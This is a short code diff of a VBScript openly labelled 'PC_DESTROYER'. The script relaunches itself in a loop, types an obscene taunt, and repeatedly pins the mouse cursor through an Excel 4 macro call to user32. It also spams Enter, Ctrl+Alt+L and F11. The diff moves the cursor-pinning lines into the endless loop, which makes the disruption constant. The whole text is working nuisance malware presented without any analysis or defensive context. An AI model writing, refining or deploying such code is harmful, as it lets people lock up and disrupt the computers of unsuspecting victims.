@@ -1,9 +1,9 @@
  Set auto=CreateObject("wscript.shell")
  CreateObject("WScript.Shell").Run WScript.ScriptFullName
  auto.sendkeys "UR PC IS FUCKED BY PC_DESTROYER"
- Dim Excel: Set Excel = WScript.CreateObject("Excel.Application") 
- Excel.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",""0"",""0"")"
  do
+    Dim Excel: Set Excel = WScript.CreateObject("Excel.Application") 
+    Excel.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",""0"",""0"")"
     auto.sendkeys "{enter}"
     auto.sendkeys "^%l"
     auto.sendkeys "{F11}"
